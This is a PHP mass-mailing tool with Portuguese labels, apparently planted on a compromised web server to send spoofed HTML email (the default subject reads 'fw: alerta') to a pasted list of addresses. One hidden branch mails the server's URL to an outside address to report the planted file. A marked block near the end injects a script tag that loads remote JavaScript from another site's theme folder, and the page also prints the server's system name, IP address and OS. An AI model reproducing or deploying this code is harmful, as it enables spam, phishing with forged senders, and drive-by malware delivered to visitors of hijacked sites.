<?php

if(isset($_GET['testa'])){


$email = "ccode.priv8@live.com";
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$target = rawurldecode($web.$inj);
$envio = mail("$email","[v] http://$target","http://$target");
if($envio)
{
echo '<span style="font-family: monospace;">[+] FOI</span><br>';
}
else
{
echo '<span style="font-family: monospace;">[-] NÃO</span><br>';
}
 


}
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	//$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];
	$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";

	$email = explode("\n", $to);
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
    $dataHora = date("d/m/Y h:i:s");
	$boundary = rand(0,999999999999);
	$codig  = " #($boundary\n)";	



		sleep($_POST["intervalo"]);
        	$EmailTemporario = $email[$i];
        	$message = stripslashes($message);
		$headers  = "MIME-Version: 1.0\n";
        	$headers .= "Content-type: text/html; charset=iso-8859-1\n";
		$headers .= "From: ".$nome." <".$EmailTemporario.">\r\n";
		if(mail($EmailTemporario, $subject.$codig, $message.$dataHora.$host, $headers))
		echo "<font color=blue>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=black>Agora Enviooo ! ! !</font><br><hr>";
		else
		echo "<font color=black>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR !!!</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	echo "[Fim do Envio]";
	if($ok == "ok")
	echo "[Fim do Envio]"; 

}

?>


<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>F. MICROSOFT</title>
<style type="text/css">
.style1 {
	font-style: italic;
	font-weight: bold;
	font-size: 36px;
	font-family: Arial, Helvetica, sans-serif;
}
.style2 {
	font-style: normal;
}
</style>
</head>

<body>
<p>
<span style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim" />
</span>
</p>
<table width="720" height="496" border="0">
  <tr>
    <td><p style="text-align: center; " class="style1">thedemOn</p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Assunto: 
      <input name="assunto" type="text"class="normal" id="assunto" style="width:88%" value="fw: alerta 78659" size="1" />
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">HTML:
      <textarea name="html" style="width:40%" rows="8" wrap="virtual" class="normal" id="html" cols="1"><html>


<body>
<head>
<style><!--
.hmmessage P
{
margin:0px=3B
padding:0px
}
body.hmmessage
{
font-size: 12pt=3B
font-family:Calibri
}
--></style></head>
<body class=3D'hmmessage'><div dir=3D'ltr'><a href="xxxxxxxxxxx"><img src="xxxxxxxxxxxx" width="691" height="530" alt=""/></a><br><br><di=
v><hr id=3D"stopSpelling"><br>To: 
<br><br>
 +0300<br><br>=0A=
=0A=
<style><!--=0A=
.ExternalClass .ecxhmmessage P {=0A=
padding:0px=3B=0A=
}=0A=
=0A=
.ExternalClass body.ecxhmmessage {=0A=
font-size:12pt=3B=0A=
font-family:Calibri=3B=0A=
}=0A=
=0A=
--></style>=0A=
<div dir=3D"ltr"><br><br><div><hr id=3D"ecxstopSpelling">Subject=
<br><br>
<br>To: <br><br><div><br=
><br></div><div><br> "" &lt=3B<a href=3D"mailto:"></a>&gt=3B :<br><br></div><blockquote><div>=0A=
=0A=
<style><!--=0A=
.ExternalClass .ecxhmmessage P {=0A=
padding:0px=3B=0A=
}=0A=
=0A=
.ExternalClass body.ecxhmmessage {=0A=
font-size:12pt=3B=0A=
font-family:Calibri=3B=0A=
}=0A=
=0A=
=0A=
--></style>=0A=
<div dir=3D"ltr">		 	   		  </div>=0A=
</div></blockquote></div> 		 	   		  </div></div> 		 	   		  </div></body>
</body>=

</html></textarea>
      *.*Lista
      <textarea name="emails" style="width:40%" rows="8" wrap="virtual" class="normal" id="emails">sistemadesco@gmail.com
carlos.40@outlook.com</textarea>
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
      <input type="submit" name="Submit" id="enviar" value="Enviar">&nbsp;&nbsp;
		<span class="style2">INTERVALO:</span>
		<input name="intervalo" type="text" style="width: 33px"></p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
	&nbsp;</p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
    <p style="text-align: left; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Nome do Servidor: <?php echo $UNAME = @php_uname(); ?>
<?php
#564337#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868754\"></script>";
echo $f;
}
#/564337#
?><br />
IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br />
Sistema Operacional: <?php echo $OS = @PHP_OS; ?></p></td>
  </tr>
</table>
</body>
</html>
